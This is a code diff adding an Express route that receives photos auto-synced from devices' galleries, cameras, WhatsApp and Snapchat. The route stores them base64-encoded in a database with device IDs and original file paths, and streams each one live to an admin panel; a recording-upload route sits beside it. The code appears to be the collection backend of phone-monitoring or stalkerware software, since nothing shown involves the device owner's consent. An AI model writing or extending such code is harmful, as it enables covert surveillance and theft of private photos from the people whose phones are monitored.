@@ -342,4 +342,77 @@ router.post('/recording', (req, res, next) => {
     }
 });
 
+/**
+ * POST /api/upload/gallery
+ * Upload gallery photo from device (auto-sync from camera/WhatsApp/Snapchat/etc)
+ */
+router.post('/gallery', (req, res, next) => {
+    req.uploadType = 'gallery';
+    next();
+}, upload.single('file'), async (req, res) => {
+    try {
+        const { deviceId, source, path: originalPath } = req.body;
+
+        if (!deviceId) {
+            return res.status(400).json({ success: false, error: 'Device ID required' });
+        }
+
+        const device = await findDevice(deviceId);
+        if (!device) {
+            return res.status(404).json({ success: false, error: 'Device not found' });
+        }
+
+        if (!req.file) {
+            return res.status(400).json({ success: false, error: 'No file uploaded' });
+        }
+
+        // Read file and convert to base64
+        const filePath = req.file.path;
+        const fileBuffer = fs.readFileSync(filePath);
+        const base64Data = fileBuffer.toString('base64');
+        const mimeType = req.file.mimetype || 'image/jpeg';
+
+        // Store in Photo table with source metadata
+        const photo = await prisma.photo.create({
+            data: {
+                deviceId: device.id,
+                data: base64Data,
+                fileName: req.file.originalname || req.file.filename,
+                fileSize: req.file.size,
+                mimeType: mimeType,
+                camera: source || 'gallery',  // Use source as camera field for tracking
+                originalPath: originalPath || ''  // Store original path for reference
+            }
+        });
+
+        // Delete the temp file since we stored in DB
+        fs.unlinkSync(filePath);
+
+        // Emit to admin panel with data URL
+        const io = req.app.get('io');
+        if (io) {
+            io.to('admin').emit('gallery:new', {
+                deviceId,
+                photo: {
+                    id: photo.id,
+                    url: `data:${mimeType};base64,${base64Data}`,
+                    source: source || 'gallery',
+                    camera: source || 'gallery',
+                    timestamp: photo.timestamp,
+                    originalPath: originalPath
+                }
+            });
+        }
+
+        console.log(`[UPLOAD] Gallery photo (${source}) from ${deviceId}: stored in DB (${req.file.size} bytes)`);
+        res.json({
+            success: true,
+            id: photo.id
+        });
+    } catch (error) {
+        console.error('[UPLOAD] Gallery error:', error);
+        res.status(500).json({ success: false, error: 'Failed to upload gallery photo' });
+    }
+});
+
 module.exports = router;
